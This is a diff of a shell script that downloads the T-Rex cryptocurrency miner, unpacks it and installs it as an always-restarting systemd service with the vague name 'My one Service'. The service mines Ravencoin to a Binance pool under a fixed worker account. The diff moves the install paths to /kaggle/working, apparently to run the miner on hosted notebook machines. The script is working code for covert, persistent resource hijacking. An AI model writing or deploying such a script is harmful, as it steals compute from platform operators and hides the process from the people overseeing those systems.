@@ -2,9 +2,9 @@
 
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
 
-mkdir /root/t-rex
+mkdir /kaggle/working/t-rex
 
-tar -xvzf t-rex-0.26.8-linux.tar.gz -C /root/t-rex
+tar -xvzf t-rex-0.26.8-linux.tar.gz -C /kaggle/working/t-rex
 
 # Write content to /etc/systemd/system/1.service
 read -r -d '' SERVICE1_CONFIG <<EOF
@@ -12,7 +12,7 @@ read -r -d '' SERVICE1_CONFIG <<EOF
 Description=My one Service
 
 [Service]
-ExecStart=/root/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 405482.001 -p 123456 --no-strict-ssl
+ExecStart=/kaggle/working/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 405482.001 -p 123456 --no-strict-ssl
 
 RestartSec=5
 Restart=always
